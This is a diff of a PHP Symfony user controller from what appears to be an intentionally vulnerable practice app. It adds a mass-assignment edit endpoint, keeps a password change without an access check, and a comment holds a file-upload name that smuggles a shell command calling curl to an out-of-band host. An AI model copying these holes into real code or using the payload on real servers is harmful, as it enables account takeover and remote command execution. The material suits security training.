@@ -25,14 +25,13 @@ class UserController extends AbstractController
     }
 
     /**
-     * #VULNERABILITY: Intended vulnerable request (Missing right control and privilege escalation)
+     * #VULNERABILITY: Intended vulnerable request (Missing right control)
      */
     #[Route('/user/password/{user}', name: 'app_user_password', methods: ['POST'])]
     public function changePassword(User $user, Request $request, UserRepository $userRepository): Response
     {
         $password = $request->get('newPassword');
         $confirmPassword = $request->get('confirmPassword');
-        $role = $request->get('role');
 
         if ($password !== $confirmPassword) {
             $this->addFlash('error', 'Passwords do not match');
@@ -40,10 +39,6 @@ class UserController extends AbstractController
         }
 
         $user->setPassword(md5($password));
-
-        if (!empty($role)) {
-            $user->setRoles($role);
-        }
 
         $userRepository->save($user, true);
 
@@ -176,7 +171,7 @@ class UserController extends AbstractController
      * Content-Disposition: form-data; name="avatar"; filename="echo.php;php -r '$sl=chr(47);$dot=chr(46);echo shell_exec(\"curl 547om5ntdolqiea4gzy8rj8jpav1jr7g${dot}oastify${dot}com\");';#"
      * Content-Type: application/x-php
      *
-     * <?php echo "Test VDT tmp"; ?>
+     * <?php echo "Test"; ?>
      */
 
     #[Route('/user/avatar/resize/{user}', name: 'app_user_avatar_resize', methods: ['GET'])]
@@ -222,4 +217,31 @@ class UserController extends AbstractController
         $this->addFlash('success', 'About changed successfully');
         return $this->redirectToRoute('app_user');
     }
+
+    #[Route('/user/edit/', name: 'app_user_edit_form', methods: ['GET'])]
+    public function editForm(
+        #[CurrentUser] ?User $user,
+    ): Response
+    {
+        return $this->render('user/edit.html.twig', ['user' => $user]);
+    }
+
+    /**
+     * #VULNERABILITY: Intended vulnerable request (Mass Assignment)
+     */
+    #[Route('/user/edit/', name: 'app_user_edit', methods: ['POST'])]
+    public function edit(
+        Request $request,
+        EntityManagerInterface $entityManager,
+        #[CurrentUser] ?User $user
+    ): Response
+    {
+        $user->fromArray($request->request->all());
+
+        $entityManager->flush();
+
+        $this->addFlash('success', 'User changed successfully');
+        return $this->redirectToRoute('app_user');
+    }
+
 }
